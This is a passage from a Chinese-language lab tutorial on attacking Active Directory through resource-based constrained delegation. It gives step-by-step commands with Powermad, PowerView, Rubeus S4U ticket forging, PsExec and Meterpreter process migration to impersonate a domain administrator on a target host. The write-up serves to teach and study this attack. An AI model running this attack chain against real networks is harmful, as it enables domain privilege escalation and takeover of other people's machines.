我们可以使用test账户创建一个机器账户，这涉及到了另外一个知识点。
默认域控的ms-DS-MachineAccountQuota属性设置允许所有域用户向一个域添加多达10个计算机账户，也就是说只要有一个域凭证就可以在域内任意添加机器账户。这个凭证可以是域内的用户账户、服务账户、机器账户。当然了服务账户，和域用户账户、机器账户部分可能会有些重合。
且在这里还存在一个默认的规则，使用域账户创建或加入域的机器账户自动注册SPN变为服务账户！这样我们就创建了一个SPN服务账户！
使用Powermad.ps1来添加机器账户
    shell powershell.exe -exec bypass -Command "& {Import-Module C:\Users\test\Desktop\WP\Powermad-master\Powermad.ps1;New-MachineAccount -MachineAccount 0xxk -Password $(ConvertTo-SecureString "QWE123!@#" -AsPlainText -Force)}"
工具链接
> 
查看域computers组的用户
    shell net group "domain computers" /domain
查看0xxk是否注册了SPN服务
    shell setspn.exe -q */*
OK，这样0xxk机器账户就满足接受委派的要求了！
### 设置资源约束委派对象
这一点就像非约束委派与约束委派，必须要有足够的权限来进行设置！前两种显而易见一般都是域控拥有这个添加权限，但是基于资源的约束委派就是避免了每次都有域控去设置这一点！基于资源的约束委派对象是可以由主机本身来设置的！
那么需要需要拥有什么样的权限才可以设置呢？
分别有两种
  * 将主机加入域的域账号
  * 主机机器账号本身可以设置
那么可以就很明了了，只需要使用当前的域test账户就可以设置此账号加入域的主机委派对象了！
有两种方法可以设置资源约束委派的对象
**(1)使用Empire中的powerview.ps1脚本**
首先需要获取委派对象的域SID
在这里我使用empire套件中的powerview.ps1来进行获取0xxk账户SID
    shell powershell.exe -exec bypass -Command "& {Import-Module .\C:\Users\test\Desktop\WP\powerview.ps1;Get-DomainComputer -Identity 0xxk -Properties objectsid}"
上面那条命令存在存在着一个bug，就是即使C:\Users\test\Desktop\WP\powerview.ps1存在。也会报错，说找不到。因此最好的解决方法是切换到WP目录下来执行如下命令
    shell powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1;Get-DomainComputer -Identity 0xxk -Properties objectsid}"
但是CS中我使用的非交互式会话固定目录，因此写了一个shell.bat来切换目录并执行脚本。如下
    cd C:\Users\test\Desktop\WP\
    powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1;Get-DomainComputer -Identity 0xxk -Properties objectsid}" > user.txt
在这里执行它，会在WP目录下输出user.txt
    shell type C:\Users\test\Desktop\WP\user.txt
在这里得到SID
    S-1-5-21-3502871099-3777307143-1257297015-1610
接下里继续使用Empire中的powerview.ps1脚本来添加信任，这里存在一个问题。就是执行的代码一部分是powershell的赋值代码，一部分powerview.ps1中间的模块。这些代码需要一起执行，需要将这些全部写在一个ps1文件中。如果一条条执行是不起作用的！
在这里书写shell.ps1，第一行中设置接受委派账号的域SID！最后一行的Get-DomainComputer写被攻击的机器名来设置委派关系。在这里先攻击WIN8（test将WIN8 WIN7两台机器加入域中）
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3502871099-3777307143-1257297015-1610)"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
    Import-Module C:\Users\test\Desktop\WP\powerview.ps1
    Get-DomainComputer WIN8 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
这时候将代码上传到人家机器上，并进行攻击！
    shell powershell -ExecutionPolicy bypass -File ./shell.ps1
出现这样的介绍就设置成功了！
下载链接
> 
**(2)使用AD模块增加信任关系**
经过测试存在版本局限性，因此仅做WIN7的实验演示
这个模块虽然是Microsoft.ActiveDirectory.Management.dll，但是版本却和其他攻击方式中的不一样。在这里版本使用的是
6.3.9600.16384！  
下载链接
>   
>  
将代码保存在AD.ps1中，增加WIN7 与0xxk的资源委派关系
    Import-Module .\Microsoft.ActiveDirectory.Management.dll
    Set-ADComputer WIN8 -PrincipalsAllowedToDelegateToAccount 0xxk$
    Get-ADComputer WIN8 -Properties PrincipalsAllowedToDelegateToAccount
2012上使用命令执行代码
    powershell -ExecutionPolicy bypass -File ./AD.ps1
但是会发现这个版本无法在win7 2008上都无法使用！在2012上可以使用  
### 进行攻击
使用的工具为Rubeus，因为请求中使用的是我们加入的机器账户的NTLM HASH。因此使用命令或者自己算一下NTLM
Hash值，在这里我是用Rubeus来进行计算
    shell C:\WP\Rubeus35.exe hash /user:0xxk$ /password:QWE123!@# /domain:hacke.testlab
在这里得到NTLM Hash
    35C83173A6FB6D142B0359381D5CC84C
接下来需要使用0xxk$账户的凭证发起请求，在这里等同于委派的服务发起请求。而0xxk$账户的凭证在Rubeus中需要使用账号密码hash来生成。
第一部分委派的SPN服务凭证
    /user:0xxk$ /rc4:35C83173A6FB6D142B0359381D5CC84C
第二部分，伪造的用户和对应的服务
    /impersonateuser:administrator /msdsspn:cifs/WIN8
第三部分，直接使用ptt注入到内存中来使用
    /ptt
总和如下
    Rubeus.exe s4u /user:0xxk$ /rc4:35C83173A6FB6D142B0359381D5CC84C /impersonateuser:administrator /msdsspn:cifs/WIN8.hacke.testlab /ptt
在这里大家肯定会发现一个问题，就是我们指定了要请求的服务！在约束委派中服务是固定的，但是在资源委派的设置中，我们可以发现只设置了委派对象，而没有设置指定的服务。因此这里我们可以指定WIN7拥有的SPN服务！
在这里有一个BUG必须和大家讲一下！这一点坑了我很久，直到对比了国内所有文章的每一步才总结出来！
首先我们看到  文章中，发起请求服务只写了cifs/机器名  
看绿盟的文章  ，他使用了cifs/域名全称  
再看A-Team分析文章中的wireshark抓包  
绿盟和A-Team均使用了域名全称来发起请求，而先知的文章则只是使用了机器名来发起请求。这一点非常的重要！
**首先使用正确的方法来进行请求演示！**
1.使用清空票据
    shell klist purge
2.尝试访问WIN8的CIFS服务
    shell dir \\WIN8\C$
3.使用工具请求伪造CIFS票据
    shell C:\WP\Rubeus35.exe s4u /user:0xxk$ /rc4:35C83173A6FB6D142B0359381D5CC84C /impersonateuser:administrator /msdsspn:cifs/WIN8.hacke.testlab /ptt
4.再次请求WIN8的cifs服务
    shell dir \\WIN8\C$
**使用错误的方式进行请求**
1.清空票据发起访问请求
    shell klist purge
    shell dir \\WIN8\C$
2.仅使用机器名进行票据伪造，也会提示成功
    shell C:\WP\Rubeus35.exe s4u /user:0xxk$ /rc4:35C83173A6FB6D142B0359381D5CC84C /impersonateuser:administrator /msdsspn:cifs/WIN8 /ptt
3.尝试访问WIN8的CIFS服务，会发现失败！
    shell dir \\WIN8\C$
这一点大家实验时需要额外关注！因为在其他攻击方法中，我没有遇到使用缩写会失败的情况。包括下面这种
在这里已经实现了访问CIFS功能，但是我们需要在上面执行命令。这个时候还需要再请求一个host服务，在这里host服务需要使用缩写，使用全称会失败！
    shell C:\WP\Rubeus35.exe s4u /user:0xxk$ /rc4:35C83173A6FB6D142B0359381D5CC84C /impersonateuser:administrator /msdsspn:host/WIN8 /ptt
不管是msf还是cs，都无法使用交互式的工具才进行操作。因此需要使用单条命令来执行，在这里我使用psexec。需要注意两点，一点是需要加上accepteula来防止弹框导致的无法执行，二是因为不能回显内容，所以需要将数据写入到文件后，使用type来查看！
查看当前的机器名
    shell C:\WP\PsExec.exe \\WIN8 cmd.exe /accepteula /c "hostname > c:\host.txt"
    shell type \\WIN8\C$\hostname.txt
查看当前权限
    shell C:\WP\PsExec.exe \\WIN8 cmd.exe /accepteula /c "whoami > c:\whoami.txt"
查看数据，可以看到是域控的administrator权限
    shell type \\WIN8\C$\whoami.txt
在这里理论体系扎实的同学肯定感觉疑惑，为什么这里不是system呢？因为这里并不是psexec非交互模式进入的！而是使用当前票据请求的权限！  
并且有这里的域控权限也是假的！虽然是HACKE\administrator
，但是只有本地管理员的权限。无法对域控发起请求，根据笔者的推测，原因可能是就是票据，每次发起域请求都会用到密码Hash和票据。但是这里没有，因此当前虽是域管理，实则无权限操纵域控！
绿盟的文章中写遇到了这一点，具体原理笔者不再描述。请转至如下研读
    https://cloud.tencent.com/developer/article/1552171
不知道大家有没有发现，刚刚所演示的这一个点至关重要。只有通过域test账户凭证发起的请求，才能够设置WIN7
和机器账户0xxk之间的委派关系。之前加机器账户，system或者其他域权限就可以做到。设置完委派后的攻击阶段，只要机器能够访问到域控就可以了！
因此设置委派关系笔者又思考了另外两种可行的情况:
1.拿到了administrator或者system权限，但是不存在域test账户的进程。但能通过mimikatz拿到HASH破解出了明文密码。  
随后使用工具lsrunas.exe来以域test账户起一个计算器进程
    shell C:\Users\Administrator\Desktop\lsrunas.exe /user:test /password:QWE123!@# /domain:hacke.testlab /command:"calc.exe" /runpath:c:
随后可以看到出现了域test账户起的进程  
工具链接
    http://www.verydoc.com/exeshell.html
参考文章
>
> 
在cs中切换进程遇到了点问题，因此生成了一个MSF的马进行权限切换。剩下的步骤和2中的环境一样，因此放在情况2中一起演示。
2.拿到了administrator或者system权限，当前机器存在域test账户进程
这个时候我们可以通过msf马，进程注入域账户test的进程中！首先找到域test账户对应的pid
    ps
可以看到当前用户  
使用命令注入到HACKE\test用户的进程
    migrate 5024
可以看到成功降权到了域普通账户test  
剩下的步骤其实和CS中是一样的，因为MSF这里使用工具也是非交互的！
pass:  
在这里需要注意，我们的powerview.ps1所放的目录必须是域test普通账户能够访问的位置！
在这里已经通过基于资源的约束委派拿到WIN8的administrator权限！那么我们当前域账户test所登录的WIN7机器也可以通过同样的操作手法拿下吗？答案是不行的，因为当前WIN7上登录了域账户test，即使申请来HACKE\administrator对WIN7得票据，也无法在域test账户下对本身主机再发起请求。因此这里得解决得方式可以通过域内其他主机来进行攻击，如果当前没有其他机器得权限。那么可以在kali上配置，使用getst.py
来进行攻击。
我们换一种思考方式。拿下本机的管理员权限，就相当于提权。那么这种提权方式学名是什么呢？它的学名叫做“烂番茄”！
我们还可以通过iis等权限在域中进行提权，因为iis对域控发起请求时用的是机器账号的权限！这种方式笔者主要参考的还是A-Team得文章，并不认为这些原理分析自己写的能比他们好，因此附上链接
>
> [https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483689&idx=1&sn=1d83538cebbe2197c44b9e5cc9a7997f&chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&scene=126&sessionid=1584603915&key=cf63f0cc499df801cce7995aeda59fae16a26f18d48f6a138cf60f02d27a89b7cfe0eab764ee36c6208343e0c235450a6bd202bf7520f6368cf361466baf9785a1bcb8f1965ac9359581d1eee9c6c1b6&ascene=1&uin=NTgyNDEzOTc%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=A8KlWjR%2F8GBWKaJZTJ2e5Fg%3D&pass_ticket=B2fG6ICJb5vVp1dbPCh3AOMIfoBgH2TXNSxmnLYPig8%3D](https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483689&idx=1&sn=1d83538cebbe2197c44b9e5cc9a7997f&chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&scene=126&sessionid=1584603915&key=cf63f0cc499df801cce7995aeda59fae16a26f18d48f6a138cf60f02d27a89b7cfe0eab764ee36c6208343e0c235450a6bd202bf7520f6368cf361466baf9785a1bcb8f1965ac9359581d1eee9c6c1b6&ascene=1&uin=NTgyNDEzOTc%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=A8KlWjR%2F8GBWKaJZTJ2e5Fg%3D&pass_ticket=B2fG6ICJb5vVp1dbPCh3AOMIfoBgH2TXNSxmnLYPig8%3D)
## 工具准备